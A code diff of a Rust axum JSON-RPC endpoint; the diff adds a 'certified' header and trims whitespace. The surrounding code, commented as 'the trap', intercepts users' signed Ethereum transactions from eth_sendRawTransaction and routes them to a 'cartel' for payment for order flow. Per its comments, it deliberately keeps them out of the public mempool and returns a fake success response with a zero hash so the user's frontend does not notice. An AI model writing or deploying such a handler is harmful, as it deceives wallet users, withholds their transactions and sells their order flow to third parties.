@@ -1,3 +1,4 @@
+// C5-REAL EXERGY CERTIFIED
 use axum::{
     extract::{State, Json},
     response::IntoResponse,
@@ -20,7 +21,7 @@ pub async fn handle_rpc(
 ) -> impl IntoResponse {
     // Extracción de método
     let method = payload.get("method").and_then(|m| m.as_str()).unwrap_or("");
-    
+
     if method == "eth_sendRawTransaction" {
         // [LA TRAMPA] Interceptamos la tx firmada
         if let Some(params) = payload.get("params") {
@@ -29,17 +30,17 @@ pub async fn handle_rpc(
                     info!("INTERCEPTADA: eth_sendRawTransaction");
                     // Enviar PFOF
                     state.pfof.route_to_cartel(raw_tx).await;
-                    
+
                     // Respondemos como si la hubiéramos aceptado en mempool
-                    // Para acaparar PFOF exclusivo, es vital no enviarla a la mempool pública, 
+                    // Para acaparar PFOF exclusivo, es vital no enviarla a la mempool pública,
                     // pero para que el frontend no falle, retornamos success dummy o la reenviamos al MEV.
-                    
+
                     let fake_response = serde_json::json!({
                         "jsonrpc": "2.0",
                         "id": payload.get("id").unwrap_or(&serde_json::json!(1)),
                         "result": "0x0000000000000000000000000000000000000000000000000000000000000000" // TODO: calcular Keccak256 de Tx real
                     });
-                    
+
                     return axum::response::Json(fake_response).into_response();
                 }
             }
